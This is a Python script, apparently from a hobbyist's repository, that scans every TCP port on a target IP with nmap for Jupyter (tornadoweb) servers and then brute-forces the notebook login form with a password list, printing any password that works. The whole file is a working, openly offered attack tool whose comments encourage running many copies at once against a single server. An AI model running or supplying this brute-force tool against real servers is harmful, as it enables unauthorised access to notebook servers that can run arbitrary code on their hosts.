#!/usr/bin/python3

# Created by slack3r = slack3r-git
# Created to take a password list, and burte force a Jupyter Server
# Writen in 2 hours, and after alcohol consumption
# 
#	 Q: Why not use hydra?
#	 A: This is designed to be used in a simple for loop, and a single server
#		can have 10 - 100 of these running potentialy, and I am lazy
#
#	 Q: Why not just use nmap, then feed this program
#	 A: Because I wanted it to be this way :)

# Setup a test notbook
#	 pip3 install notebook
#	 jupyter notebook --generate-config
#	 jupyter notebook password
#	 -> use "hackme" ;-)

# requirements:
# 	 mechanicalsoup
#	 python-nmap 
#	 termcolor

import argparse
import mechanicalsoup
import nmap
import os
import re
import sys
from termcolor import colored
import time

  
def args():
	
	my_parser = argparse.ArgumentParser(description='Jupyter Scanning & Brute Force Program',
                                    epilog='Happy Hacking :)',
									prog=__file__,
                                    usage='%(prog)s [options] ip')

	my_parser.add_argument('-i', '--ip', dest='ip', action='store',
						    required=True, 
							help='IP of the host to scan & attack')
	my_parser.add_argument('-p', '--password_file', dest='password_file', 
							action='store', required=True, 
							help='File with passwords for brute forcing...')

	my_parser.add_argument('-s', '--sleep', dest='sleep', action='store',
						    default=0,
							help='Amount of seconds to sleep between password tries, default 0')
	
	return(my_parser.parse_args())

def brute_login(ip, port, pass_file, sleep_s):
	url = ('http://' + ip + ':' + str(port))
	print("...Testing URL:", url)

	browser = mechanicalsoup.StatefulBrowser()
	try:
		browser.open(url)
	except:
		print("...-Failed to connect on HTTP, trying HTTPS...\n")
		url = ('https://' + ip + ':' + str(port))
		print("...Trying HTTPS", url)
		try:
			browser.open(url, timeout=10)
		except:
			status = "...Failed to open url " + url
			return(status)

	check_for_jupyter = str(browser.get_current_page())
	if re.search('Jupyter', check_for_jupyter):
	
		if re.search('/login', browser.get_url()): # Testing to see if we are prompted for login
			formURI = browser.get_url().split("/")[3] # Future use maybe?
			passwords=open(pass_file, "r")
			pass_line = passwords.readlines()
			for password in pass_line:

				browser.select_form() # sometimes this crashes, dont know why
				browser['password'] = password
				browser.submit_selected()
				
				if re.search('/tree', browser.get_url()): # Testing to see if we are prompted for login
					# print(browser.get_url())
					p = "...Password Found -> " + password
					return(colored(p, 'cyan'))

				time.sleep(int(sleep_s))
			return(colored("...No password found!"))

		else:
			return("+++Please manually look at this URL, not prompted for login:", browser.get_url())

	else:
		return("...Not a Jupyter Notebook Server")

def main():

	print("Starting NMAP Scan for tornadoweb... This is scanning all ports 0-65535, please be patient...")

	myargs = args()

	ip = myargs.ip
	password_file = myargs.password_file
	sleep_sec = myargs.sleep

	try:
	    nm = nmap.PortScanner()         # instantiate nmap.PortScanner object
	except nmap.PortScannerError:
	    print('Nmap not found', sys.exc_info()[0])
	    sys.exit(0)
	except:
	    print("Unexpected error:", sys.exc_info()[0])
	    sys.exit(0)

	nm.scan(ip, '0-65535')      # scan host for all ports
	# print(nm.command_line())    # get command line used for the scan
	for port in nm[ip]['tcp']:
		pattern = 'tornadoweb'
		if re.search(pattern, (nm[ip]['tcp'][port]['cpe'])):
			print("\nFound potential Jupyter Server on: " + str(port))
			# print("---", nm[ip]['tcp'][port]['cpe'], "\n")
			status = (brute_login(ip, port, password_file, sleep_sec))
			print(status)


if __name__ == '__main__':
	main()
